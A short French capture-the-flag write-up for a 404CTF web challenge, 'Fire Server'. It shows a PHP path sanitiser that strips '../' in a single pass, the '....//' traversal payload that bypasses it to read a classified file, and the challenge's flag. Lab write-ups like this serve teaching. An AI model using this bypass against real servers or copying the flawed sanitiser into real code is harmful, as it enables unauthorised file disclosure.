Fire Server 
=======================

Dans le docker file on trouve : 

.. code-block:: console 
            
    echo "Mission Selenium – Niveau 5 Confidentiel\nAnalyse de l’organisme prélevé sur la face cachée lunaire : activité bioélectrique persistante.\nExpérimentations poursuivies malgré les objections éthiques.\n404CTF{fakeflag}" > /var/files/classified/selenium && 


On sait quel fichier on souhaite récupérer : /var/files/classified/selenium 

Dans le fichier index.php on voit bien qu'il y a une local file inclusion : 

.. code-block:: php 

    $decodedPath = urldecode($path);
    $decodedPath = str_replace("../", "", $decodedPath);
    $fullPath = realpath($baseDir . $decodedPath);


On va donc faire : ?path=....//....//....//var/files/classified/selenium 

Le code va supprimer les ../ ce qui va donner ../../../var/files/classified/selenium

On obtient le flag : 

Mission Selenium – Niveau 5 Confidentiel 
Analyse de l’organisme prélevé sur la face cachée lunaire : activité bioélectrique persistante.
Expérimentations poursuivies malgré les objections éthiques.
404CTF{m0oN_S3cRe7s_4r3_bUr1eD_d33p}

Flag : **404CTF{m0oN_S3cRe7s_4r3_bUr1eD_d33p}**